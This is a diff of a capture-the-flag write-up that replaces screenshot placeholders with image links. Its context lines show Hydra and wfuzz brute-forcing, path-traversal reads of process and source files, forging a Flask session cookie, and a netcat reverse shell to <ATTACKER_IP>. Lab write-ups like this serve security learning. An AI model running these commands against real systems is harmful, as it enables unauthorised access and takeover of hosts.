@@ -85,7 +85,7 @@ hydra -L users.txt -P wordlist.txt <TARGET_IP> -s 8080 http-post-form "/login:us
 
 5. Log in with the credentials found by Hydra to obtain the first flag:
 
-[SCREEN01]
+<img width="1274" height="345" alt="SCREEN01" src="https://github.com/user-attachments/assets/02112f1e-604b-426c-ae18-1fa1508fb2ef" />
 
 ---
 
@@ -107,7 +107,7 @@ wfuzz --hl 77 -w 4-digits.txt -d "sms=FUZZ" -b session=eyJ1c2VybmFtZSI6ImFuZGVyc
 
 3. Once `wfuzz` identifies the correct 4-digit code, the application redirects to the next page which contains the second flag:
 
-[SCREEN02]
+<img width="812" height="493" alt="SCREEN02" src="https://github.com/user-attachments/assets/c5b9dba1-5e90-44a2-8e03-dd973796b342" />
 
 ---
 
@@ -119,13 +119,13 @@ _The CMD will lead you to the source._
 
 2. Send `../../../../proc/self/stat` in the payload and note the returned process ID.
 
-[SCREEN03]
+<img width="1260" height="836" alt="SCREEN03" src="https://github.com/user-attachments/assets/cf91b6a4-d602-483c-9c7b-33907568f72d" />
 
 3. Using the discovered PID, read the command-line arguments of the process to confirm the application source path. Send `../../../../proc/<PID>/cmdline` in the payload. The response should return `/usr/bin/python3/home/devops/app.py`, confirming that the Flask application source is located at `/home/devops/app.py`.
 
 4. Send `../../../../home/devops/app.py` as the path parameter to read the full application source code. The third flag is embedded within the source file:
 
-[SCREEN04]
+<img width="1268" height="836" alt="SCREEN04" src="https://github.com/user-attachments/assets/f38d652e-6bf5-4cd1-b50d-d02c25111b05" />
 
 ---
 
@@ -188,7 +188,7 @@ flask-unsign --sign --cookie "{'logged_in': True, 'username': 'admin'}" --secret
 
 6. Replace the `session` cookie in your browser with the newly generated token and navigate to `http://<TARGET_IP>:8080/admin` to access the admin panel and retrieve the fourth flag:
 
-[SCREEN05]
+<img width="1285" height="706" alt="SCREEN05" src="https://github.com/user-attachments/assets/11edaf68-4e7f-441d-ade6-9157843bffd4" />
 
 ---
 
@@ -216,7 +216,7 @@ curl 'http://<TARGET_IP>:8080/admin' -X POST -H 'Cookie: session=eyJsb2dnZWRfaW4
 cat user.txt
 ```
 
-[SCREEN06]
+<img width="880" height="410" alt="SCREEN06" src="https://github.com/user-attachments/assets/ecd7e5ee-1eda-4dfa-b6ad-955ef936db82" />
 
 ---
 
@@ -296,7 +296,7 @@ cd /home/anders
 cat user2.txt
 ```
 
-[SCREEN08]
+<img width="466" height="218" alt="SCREEN08" src="https://github.com/user-attachments/assets/f8c08795-a8e1-4233-a21d-d633540e0e0f" />
 
 ---
 
@@ -359,7 +359,7 @@ stty raw -echo;fg;
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER_IP> 4446 > /tmp/f
 ```
 
-[SCREEN09]
+<img width="765" height="536" alt="SCREEN09" src="https://github.com/user-attachments/assets/f126ed03-e3bb-43ef-b9ce-3a8565b46b07" />
 
 5. Set up a Netcat listener on port `4446` on the attacking machine:
 
@@ -379,4 +379,4 @@ sudo /sbin/service apache2 restart
 cat /root/root.txt
 ```
 
-[SCREEN10]
+<img width="473" height="129" alt="SCREEN10" src="https://github.com/user-attachments/assets/01df9dcd-dae8-417b-9701-3cbe0127ed77" />
